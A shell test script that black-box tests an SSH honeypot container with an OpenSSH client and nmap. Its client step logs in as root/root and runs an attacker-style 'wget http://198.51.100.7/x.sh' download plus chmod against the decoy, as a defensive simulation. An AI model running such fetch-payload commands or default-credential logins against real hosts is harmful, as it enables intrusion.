#!/bin/sh
# Black-box check with a real OpenSSH client and nmap against the built container.
# Usage (repo root):  sg docker -c "sh sensors/ssh/tests/blackbox.sh"
# Needs docker, network access to pull alpine and instrumentisto/nmap. Redis is unreachable on
# purpose: the publisher must drop events without affecting the session.
set -eu
cd "$(dirname "$0")/../../.."
NET=sp-ssh-bb; NAME=sp-ssh-bb; IMG=sp-ssh-bb:dev
cleanup() { docker rm -f "$NAME" >/dev/null 2>&1 || true; docker network rm "$NET" >/dev/null 2>&1 || true; docker volume rm "$NAME-keys" >/dev/null 2>&1 || true; }
trap cleanup EXIT; cleanup
docker build -q -f sensors/ssh/Dockerfile -t "$IMG" . >/dev/null
docker network create "$NET" >/dev/null
docker run -d --name "$NAME" --network "$NET" --read-only --tmpfs /tmp --cap-drop ALL \
  --security-opt no-new-privileges:true --memory 256m --cpus 0.5 --pids-limit 128 \
  -v "$NAME-keys:/data" -e REDIS_HOST=redis.invalid "$IMG" >/dev/null
for _ in $(seq 1 30); do
  [ "$(docker inspect -f '{{.State.Health.Status}}' "$NAME")" = healthy ] && break
  sleep 2
done
[ "$(docker inspect -f '{{.State.Health.Status}}' "$NAME")" = healthy ] || { echo "not healthy"; exit 1; }
echo HEALTHY
cat > /tmp/sp-bb-client.sh <<'INNER'
apk add -q openssh-client sshpass >/dev/null 2>&1
O="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -p 2222"
ssh -vv $O -o BatchMode=yes root@sp-ssh-bb true 2>&1 | grep -E "remote software version|KEX algorithms:|host key algorithms: (rsa|ssh)" | cut -c1-200
OUT=$(sshpass -p root ssh $O root@sp-ssh-bb 'uname -a; cat /proc/cpuinfo | grep name | wc -l; wget http://198.51.100.7/x.sh -O /tmp/x.sh >/dev/null 2>&1; chmod +x /tmp/x.sh; ./nothing' 2>&1)
echo "$OUT"
echo "$OUT" | grep -q "Linux srv-web01" && echo "$OUT" | grep -q "command not found\|No such file" && echo EXEC_OK
for i in 1 2 3 4 5 6 7; do ssh-keygen -q -t ed25519 -N '' -f /tmp/k$i; done
ssh $O -o IdentitiesOnly=yes -i /tmp/k1 -i /tmp/k2 -i /tmp/k3 -i /tmp/k4 -i /tmp/k5 -i /tmp/k6 -i /tmp/k7 root@sp-ssh-bb true 2>&1 | grep -q "Too many authentication failures" && echo MAXTRIES_OK
INNER
docker run --rm --network "$NET" -v /tmp/sp-bb-client.sh:/c.sh:ro alpine:3.20 sh /c.sh
docker run --rm --network "$NET" instrumentisto/nmap -sV -p 2222 "$NAME" | grep -E "^2222|Service Info"
docker logs "$NAME" 2>&1 | grep -ci "honeypot\|suckerpot\|asyncssh" | sed 's/^/giveaway_lines_in_logs=/'
rm -f /tmp/sp-bb-client.sh
